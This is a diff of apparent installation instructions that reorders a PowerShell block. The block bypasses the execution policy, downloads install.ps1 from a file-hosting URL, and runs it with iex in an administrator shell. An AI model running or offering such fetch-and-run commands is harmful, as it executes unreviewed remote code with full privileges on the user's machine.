@@ -18,9 +18,9 @@ Search then open Windows PowerShell as administrator.
 Copy then right click to paste all below commands into PowerShell window at once then hit Enter.
 
 ```ps
-$url="https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Files/7/install.ps1"
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
 Set-ExecutionPolicy Bypass -Scope Process -Force
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
+$url="https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Files/7/install.ps1"
 iex ((New-Object System.Net.WebClient).DownloadString($url))
 ```
 
